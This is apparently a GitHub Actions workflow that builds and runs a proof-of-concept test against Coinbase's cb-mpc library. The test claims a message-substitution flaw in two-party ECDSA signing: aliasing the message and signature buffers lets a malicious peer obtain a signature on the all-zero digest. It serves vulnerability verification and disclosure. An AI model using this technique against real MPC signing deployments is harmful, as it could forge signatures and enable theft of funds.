name: CBMPC ECDSA2P Inplace Message Substitution V35

on:
  workflow_dispatch:
  push:
    paths:
      - '.github/workflows/cbmpc-ecdsa2p-inplace-message-substitution-v35.yml'

permissions:
  contents: read

jobs:
  verdict:
    runs-on: ubuntu-24.04
    timeout-minutes: 45
    steps:
      - name: Clone current cb-mpc HEAD
        shell: bash
        run: |
          set -euo pipefail
          git clone https://github.com/coinbase/cb-mpc.git cb-mpc >/dev/null 2>&1
          cd cb-mpc
          git checkout fdbb60346757271d5e0241f417e55dc8f289573c >/dev/null 2>&1
          git submodule update --init --recursive >/dev/null 2>&1
          echo "tested_commit=$(git rev-parse HEAD)"

      - name: Add public API semantic substitution PoC
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          from pathlib import Path
          p=Path('cb-mpc/tests/utils/local_network/channel.cpp')
          p.write_text(p.read_text().replace('    delete queue.front();','    test_message_buffer_t::free(queue.front());'))
          PY
          cat >> cb-mpc/tests/unit/api/test_ecdsa2pc.cpp <<'CPP'

          #include <fstream>

          TEST(ApiEcdsa2pcAliasV35, InplaceMessageOutputSubstitutesZeroDigest) {
            auto c1 = std::make_shared<mpc_net_context_t>(0);
            auto c2 = std::make_shared<mpc_net_context_t>(1);
            std::vector<std::shared_ptr<mpc_net_context_t>> peers = {c1, c2};
            c1->init_with_peers(peers);
            c2->init_with_peers(peers);
            local_api_transport_t t1(c1), t2(c2);
            const coinbase::api::job_2p_t j1{party_t::p1, "alice", "bob", t1};
            const coinbase::api::job_2p_t j2{party_t::p2, "alice", "bob", t2};

            buf_t k1, k2;
            error_t d1 = UNINITIALIZED_ERROR, d2 = UNINITIALIZED_ERROR;
            run_2pc(c1, c2,
              [&] { return coinbase::api::ecdsa_2p::dkg(j1, curve_id::secp256k1, k1); },
              [&] { return coinbase::api::ecdsa_2p::dkg(j2, curve_id::secp256k1, k2); }, d1, d2);
            ASSERT_EQ(d1, SUCCESS); ASSERT_EQ(d2, SUCCESS);

            buf_t pub;
            ASSERT_EQ(coinbase::api::ecdsa_2p::get_public_key_compressed(k1, pub), SUCCESS);
            coinbase::crypto::ecc_point_t Q;
            ASSERT_EQ(Q.from_bin(coinbase::crypto::curve_secp256k1, pub), SUCCESS);
            coinbase::crypto::ecc_pub_key_t verify_key(Q);

            // P1's caller requests a non-zero 32-byte digest.
            buf_t p1_msg(32);
            for (int i = 0; i < 32; ++i) p1_msg[i] = static_cast<uint8_t>(0x41 + i);
            const buf_t requested_digest = p1_msg;

            // A malicious P2 chooses the all-zero digest.
            buf_t p2_msg(32);
            p2_msg.bzero();
            const buf_t zero_digest = p2_msg;

            buf_t sid1, sid2, p2_sig;
            error_t s1 = UNINITIALIZED_ERROR, s2 = UNINITIALIZED_ERROR;

            // Critical alias: P1 passes the same short-buffer object as message input
            // and signature output. The public wrapper calls sig_der.free() before the
            // protocol consumes msg_hash. buf_t::free() zeroizes the 32 inline bytes,
            // while the already-created mem_t view still points at them with size=32.
            run_2pc(c1, c2,
              [&] { return coinbase::api::ecdsa_2p::sign(j1, k1, p1_msg, sid1, p1_msg); },
              [&] { return coinbase::api::ecdsa_2p::sign(j2, k2, p2_msg, sid2, p2_sig); }, s1, s2);

            const int sign_success = (s1 == SUCCESS && s2 == SUCCESS && !p1_msg.empty()) ? 1 : 0;
            const int verifies_zero = sign_success && verify_key.verify(zero_digest, p1_msg) == SUCCESS ? 1 : 0;
            const int verifies_requested = sign_success && verify_key.verify(requested_digest, p1_msg) == SUCCESS ? 1 : 0;
            const int sid_match = (!sid1.empty() && sid1 == sid2) ? 1 : 0;

            std::ofstream out("/code/v35-verdict.txt", std::ios::trunc);
            out << "commit=fdbb60346757271d5e0241f417e55dc8f289573c"
                << " sign_rv=" << s1 << "," << s2
                << " sign_success=" << sign_success
                << " verifies_zero=" << verifies_zero
                << " verifies_requested=" << verifies_requested
                << " sid_match=" << sid_match
                << " sig_size=" << p1_msg.size() << "\n";
          }
          CPP

      - name: Build and run sanitizer semantic PoC
        shell: bash
        run: |
          set -euo pipefail
          cd cb-mpc
          make image >/tmp/image-build.log 2>&1
          set +e
          timeout 35m docker run --rm -v "$PWD":/code -t cb-mpc bash -lc 'make sanitize filter=ApiEcdsa2pcAliasV35.InplaceMessageOutputSubstitutesZeroDigest' >/tmp/v35.log 2>&1
          status=$?
          set -e
          echo "sanitize_exit=$status"
          if [ -f v35-verdict.txt ]; then cat v35-verdict.txt; else echo 'verdict_missing=1'; fi
          if grep -Eqi 'AddressSanitizer|runtime error:' /tmp/v35.log; then
            echo 'V35_SANITIZER_FINDING=1'
            grep -Ein -C 8 'AddressSanitizer|runtime error:' /tmp/v35.log | head -n 140 || true
            exit 2
          fi
          if [ "$status" -ne 0 ]; then
            echo 'V35_TEST_OR_BUILD_FAILURE=1'
            tail -n 140 /tmp/v35.log
            exit 1
          fi
          zero=$(sed -n 's/.*verifies_zero=\([0-9][0-9]*\).*/\1/p' v35-verdict.txt)
          requested=$(sed -n 's/.*verifies_requested=\([0-9][0-9]*\).*/\1/p' v35-verdict.txt)
          success=$(sed -n 's/.*sign_success=\([0-9][0-9]*\).*/\1/p' v35-verdict.txt)
          if [ "${success:-0}" -eq 1 ] && [ "${zero:-0}" -eq 1 ] && [ "${requested:-1}" -eq 0 ]; then
            echo 'ECDSA2P_MESSAGE_SUBSTITUTION_CONFIRMED=1'
            exit 2
          fi
          echo 'ECDSA2P_MESSAGE_SUBSTITUTION_CONFIRMED=0'
